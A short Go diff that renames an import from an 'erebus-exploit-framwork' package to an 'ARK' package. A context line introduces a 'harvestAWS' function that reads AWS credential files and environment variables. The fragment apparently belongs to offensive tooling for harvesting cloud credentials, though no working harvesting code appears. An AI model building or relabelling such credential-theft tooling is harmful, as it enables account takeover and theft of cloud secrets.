@@ -6,7 +6,7 @@ import (
 	"path/filepath"
 	"strings"
 
-	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
+	pb "github.com/KKingZero/ARK/pkg/pb"
 )
 
 // harvestAWS reads AWS credential files and environment variables.
